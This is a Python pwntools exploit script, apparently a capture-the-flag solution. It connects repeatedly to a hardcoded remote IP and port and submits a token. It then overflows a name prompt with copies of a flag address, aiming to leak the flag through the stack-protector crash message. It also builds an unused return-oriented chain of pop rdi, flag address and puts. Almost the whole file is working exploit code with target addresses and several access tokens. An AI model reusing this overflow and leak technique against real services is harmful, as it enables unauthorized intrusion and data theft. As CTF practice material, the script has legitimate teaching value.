from pwn import *
import time

token = "56f144efb8a2d946c0381133773c1bfbe68c30f090086d98f24159487743d622" #6
#9 56f144efb8a2d946c0381133773c1bfbe68c30f090086d98f24159487743d622
#10 78842fceafe347b74ed2e8092c99069b1ec9af66c0ae673a9ee22fc6505d603e
#11 c719d56fa430392ab85133a1d85f59bee83340616a7fc87d8bf3a3df5aae5612
#5 54a8d4a1a1ac3628539f058ab40fe595fe07da5c2755db1da6b60120a5a975fb
#7 127130e6edad263b39f9b563af1cfc208799cfd2d12622987cd8cafdbcba14a0
#6 b6e425513dfd8cc6f36034173462acb655cbce5591e3363963b7b50a214ce62b

flagloc = 0x0000000000604070
putsplt = 0x401308
poprdi = 0x0000000000402f53
ropchain = [poprdi, flagloc, putsplt]
ropsice = ""
for i in ropchain:
	ropsice += p64(i)


for i in [1008]*200:
	print i
	r = remote("178.128.84.72", 9997)
	try:
		r.recvuntil("Token> ")
		r.sendline(token)
		for b in range(9):
			print r.recvuntil("name?>", timeout=2)
			if b == 2:
				#8 shits + stack cookie
				r.sendline("A"*8)
				#r.interactive()
			elif b > 2:
				r.send(p64(flagloc)*(0x400/8-1))
			else:
				r.sendline("")
			#time.sleep(0.2)
		r.sendline("3")
		r.recvuntil("stack smashing detected", timeout=2)
		print r.recvline(timeout=2)
		r.interactive()
	except:
		r.close()
		i += 8
